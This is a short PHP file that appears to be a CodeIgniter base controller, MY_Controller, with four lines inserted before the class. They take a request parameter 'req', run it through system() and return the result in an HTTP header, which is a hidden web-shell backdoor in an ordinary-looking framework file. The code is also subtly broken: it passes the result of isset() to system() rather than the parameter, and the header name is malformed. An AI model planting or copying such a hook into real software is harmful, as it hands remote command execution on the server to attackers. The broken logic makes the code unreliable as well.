<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
class MY_Controller extends CI_Controller {
	
	public $data = array();
	function __construct() {
		parent::__construct();
		check_installer();
	}
}
